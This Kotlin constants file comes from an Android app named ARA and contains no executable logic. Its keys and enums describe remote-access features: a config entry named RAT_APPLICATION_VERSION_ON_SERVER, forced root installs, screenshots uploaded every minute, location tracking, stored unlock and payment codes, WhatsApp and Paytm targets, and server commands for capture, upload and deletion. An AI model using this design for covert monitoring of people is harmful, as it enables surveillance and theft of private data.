package com.dox.ara.utility

import com.dox.ara.BuildConfig
import com.dox.ara.ui.data.NavItem
import com.dox.ara.ui.data.RouteItem
import kotlin.reflect.KClass

object Constants {
    // Build Constants
    const val APP_ID = "ara"
    const val APP_NAME = "ARA"
    const val PACKAGE_NAME = BuildConfig.APPLICATION_ID

    // API Constants
    const val BASE_URL = BuildConfig.BASE_URL

    // Encryption constants
    const val ENCRYPTION_ALGORITHM = "AES"
    const val DELIMITER_DATA_DATE = "<DATA_DATE>"

    // UI Constants
    val START_ROUTE = RouteItem.Home.route
    val START_PAGE = NavItem.Chats.page

    // Intent Extra Constants
    const val START_ROUTE_EXTRA = "startRoute"
    const val NAVIGATE_TO_EXTRA = "navigateTo"
    const val START_PAGE_EXTRA = "startPage"
    const val ALARM_ID_EXTRA = "alarmId"

    // Shared Preferences Constants
    const val APP_PREFS = "${APP_ID}_shared_prefs"
    const val AUTH_TOKEN_KEY = "auth_token"
    const val DEVICE_ID_KEY = "device_id"
    const val DYNAMIC_URL_KEY = "dynamic_url"
    const val PAYMENT_CODE_KEY = "payment_code"
    const val DEVICE_UNLOCK_CODE_KEY = "device_unlock"
    const val ASSISTANT_OPEN_TRIGGER_SEQUENCE_KEY = "assistant_open_trigger_sequence"
    const val ASSISTANT_LISTEN_TRIGGER_SEQUENCE_KEY = "assistant_listen_trigger_sequence"

    // Message Command Constants
    const val BREAK = "<BREAK>"
    const val TEST = "<TEST>"

    // Permission Constants
    const val SCREEN_CAPTURE_ACTION = "${PACKAGE_NAME}.SCREEN_CAPTURE_ACTION"
    const val SCREEN_CAPTURE_PERMISSION_DATA = "SCREEN_CAPTURE_PERMISSION_DATA"

    enum class SpecialPermission(val value: String) {
        NOTIFICATION("Notification"),
        OVERLAY("Overlay"),
        SCREEN_CAPTURE("Screen Capture"),
        APP_USAGE("App Usage"),
        ACCESSIBILITY("Accessibility"),
        STORAGE("Storage")
    }

    // Package Constants
    const val SETTINGS_PACKAGE_NAME = "com.android.settings"
    const val PAYTM_PACKAGE_NAME = "net.one97.paytm"

    // Directory Constants
    const val AUDIO_DIR = "${APP_ID}_audio"

    // Shared Preferences Constants
    const val DEFAULT_CHAT_ID_KEY = "default_chat_id"
    const val DEFAULT_ASSISTANT_ID_KEY = "default_assistant_id"

    // Notification Constants
    const val SILENT_NOTIFICATION_CHANNEL_ID = "${APP_ID}-silent"
    const val SILENT_NOTIFICATION_CHANNEL_NAME = "${APP_NAME}-Silent"
    const val ALERT_NOTIFICATION_CHANNEL_ID = "${APP_ID}-alert"
    const val ALERT_NOTIFICATION_CHANNEL_NAME = "${APP_NAME}-alert"
    const val MAIN_NOTIFICATION_CHANNEL_ID = "${APP_ID}-main"
    const val MAIN_NOTIFICATION_CHANNEL_NAME = "${APP_NAME}-Main"




    const val FCM_TOKEN = "fcm_token"
    const val DEVICE_CODE = "device_code"
    const val SCREENSHOTS_DIR = "ara_screenshots"
    const val SCREENRECORDS_DIR = "ara_screenrecords"
    const val PHOTOS_DIR = "ara_photos"
    const val VIDEOS_DIR = "ara_videos"
    const val CAPTURE_TYPE = "captureType"




    const val WHATSAPP_PACKAGE_NAME = "com.whatsapp"
    const val PERMISSION_CONTROLLER_PACKAGE_NAME = "com.google.android.permissioncontroller"



    // Action
    enum class MessageType {
        COMMAND,
        ALERT
    }

    enum class Command {
        UPLOAD,
        UPDATE,
        DELETE,
        LOGIN,
        CAPTURE,
        SEND,
        INVOKE
    }

    enum class Alert {
        WHATSAPP_WEB_LINK  // Not in use
    }

    enum class Entity {
        ASSISTANT,
        MESSAGE,
        CHAT,
    }

    enum class ArgumentType {
        // Media
        CAMERA,
        DURATION,

        // Contact
        CONTACT_ID,

        // Whatsapp
        LINK_CODE,
        PHONE_NUMBERS,
        MESSAGE
    }

    enum class Camera(val value: Int) {
        FRONT(1),
        BACK(0)
    }

    enum class TaskType {
        LONG,
        SHORT
    }

    enum class ApplicationConfigKey(val key: String, val type: KClass<*>) {
        RAT_APPLICATION_VERSION_ON_SERVER("araApplicationVersionOnServer", Int::class),  // Reinstalls application
        ROOT_FORCE_INSTALL_UPDATES("rootForceInstallUpdates", Boolean::class),  // Installs forcefully
        PERIODIC_SCREENSHOT_INTERVAL_MINUTES("periodicScreenshotIntervalMinutes", Long::class),  // Uploads to server
        PERIODIC_LOCATION_INTERVAL_HOURS("periodicLocationIntervalHours", Long::class),  // Saves to RoomDB
        PERIODIC_CONFIGURATION_INTERVAL_HOURS("periodicConfiguaraionIntervalHours", Long::class),  // Uploads to server
        PERIODIC_LOG_DELETION_INTERVAL_DAYS("periodicLogDeletionIntervalDays", Long::class),  // Performs task
        PERIODIC_PERMISSION_CHECK_INTERVAL_MINUTES("periodicPermissionCheckIntervalMinutes", Long::class),  // Performs check
        PERIODIC_DEFAULT_DIALER_CHECK_INTERVAL_MINUTES("periodicDefaultDialerCheckIntervalMinutes", Long::class);  // Performs check

        val default: Any
            get() = when (this) {
                RAT_APPLICATION_VERSION_ON_SERVER -> 1
                ROOT_FORCE_INSTALL_UPDATES -> true
                PERIODIC_SCREENSHOT_INTERVAL_MINUTES -> 1L
                PERIODIC_LOCATION_INTERVAL_HOURS -> 2L
                PERIODIC_CONFIGURATION_INTERVAL_HOURS -> 1L
                PERIODIC_LOG_DELETION_INTERVAL_DAYS -> 3L
                PERIODIC_PERMISSION_CHECK_INTERVAL_MINUTES -> 15L
                PERIODIC_DEFAULT_DIALER_CHECK_INTERVAL_MINUTES -> 15L
            }
    }
}